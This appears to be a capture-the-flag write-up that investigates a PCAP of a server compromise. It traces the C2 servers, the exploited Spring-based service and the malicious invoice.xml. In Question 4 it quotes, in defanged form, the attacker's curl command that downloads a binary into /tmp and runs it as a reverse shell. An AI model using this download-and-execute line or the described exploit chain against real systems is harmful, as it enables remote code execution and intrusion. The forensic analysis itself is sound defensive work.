<h2>Question 1 </h2>
<b>By identifying the C2 IP, we can block traffic to and from this IP, helping to contain the breach and prevent further data exfiltration or command execution. Can you provide the IP of the C2 server that communicated with our server?</b>

<br>First of all, lets check to see the conversations that was captured in this PCAP. Under the statistics tab, navigate to the Conversions and you will notice that a particular communication involved large transmission in bytes from the source IP address to a particular destination IP address on port 443 and given that data exfiltration is being investigated. So, this communication seems obvious.

<p align="center">
<img src="https://imgur.com/6yjWjrD.png" height="100%" width="80%" alt="C2 Server"/> 
<br />

<h2>Question 2 </h2>
<b>Initial entry points are critical to trace back the attack vector. What is the port number of the service the adversary exploited?</b>
<br>The C2 server connected to a destination host on a particular port. That destination port is the entry port.<br />
<p align="center">
<img src="https://imgur.com/S819f47.png" height="100%" width="80%" alt="Entry_port"/> 
<br />

<h2>Question 3 </h2>
<b>Following up on the previous question, what is the name of the service found to be vulnerable?</b>
<br>With reference to question 2, follow the TCP stream to get the name of the service or simply google the service that runs by default on exploited port

<p align="center">
<img src="https://imgur.com/4zL7RVU.png" height="100%" width="80%" alt="Vuln_service1"/>, 
<br />
<p align="center">
<img src="https://imgur.com/GIvyXUE.png" height="100%" width="80%" alt="Vuln_service2"/>
<br />

<h2>Question 4 </h2>
<b>The attacker's infrastructure often involves multiple components. What is the IP of the second C2 server? </b><br />
<br> We followed a TCP stream in question 3 and noticed that a URL path hxxp[://]146[.]198[.]21[.]92:8888/invoice.xml pointing to an XML file named <b>invoice.xml</b> which seems to be path to an application configuration file. Using the "org.springframework.context.support.ClassPathXnlApplicationContext" which is a class from the Spring Framework used for loading application contexts fron XML files to load the invoice.xml file. Now, follow the HTTP stream of the frame that contains the URL, you will notice an enbedded script <b>"curl -s -o /tmp/docker hxxp[://]128[.]199[.]52[.]72/docker; chmod +x /tmp/docker; /tmp/docker"</b> which downloads the file "docker" silently from hxxp[://]128[.]199[.]52[.]72/docker to the path /tmp/docker, makes it an executable and then executes the script. So, the server IP that contained the executable file is the C2 server.

<p align="center">
<img src="https://imgur.com/CiGIyVJ.png" height="100%" width="80%" alt="C2 server"/> 
</br>

<h2>Question 5 </h2>
<b>Attackers usually leave traces on the disk. What is the name of the reverse shell executable dropped on the server?</b><br />
<br> Referencing the script observed within the invoice.xml file, the executable file stored in the /tmp directory is your answer or you can filter using the C2 server as a destination with a GET HTTP request method (ip.dst eq 128.199.52.72 and http.request.method eq GET). Follow the HTTP stream and you will seen the format of the file and the name of the file </br>
<p align="center">
<img src="https://imgur.com/KgXfsNC.png" height="100%" width="80%" alt="Executable_file"/> 
<br/>

<h2>Question 6 </h2>
<b>What Java class was invoked by the XML file to run the exploit?</b><br />
<br> Read the content of the invoice.xml file after following its HTTP stream, you would see what you are looking for.<br />

<p align="center">
<img src="https://imgur.com/ZdjsdEK.png" height="100%" width="80%" alt="Java_class"/> 
<br />

  
<h2>Question 7 </h2>
<b>To better understand the specific security flaw exploited, can you identify the CVE identifier associated with this vulnerability?</b><br />
<br> A simple google search of the vulnerability associated with the identified vulnerable service

<p align="center">
<img src="https://imgur.com/0XktE4L.png" height="100%" width="80%" alt="CVE_ID"/> 
<br />

<h2>Question 8 </h2>
<b>What is the vulnerable Java method and class that allows an attacker to run arbitrary code? (Format: Class.Method)</b><br />
<br> This questions requires you to research more on the vulnerability. My approach was to compare and note the difference between the patch of the vulnerability and the initial code. 
<p align="center">
<img src="https://imgur.com/Dr5YUj9.png" height="100%" width="80%" alt="Java_class.method"/> 
<br />



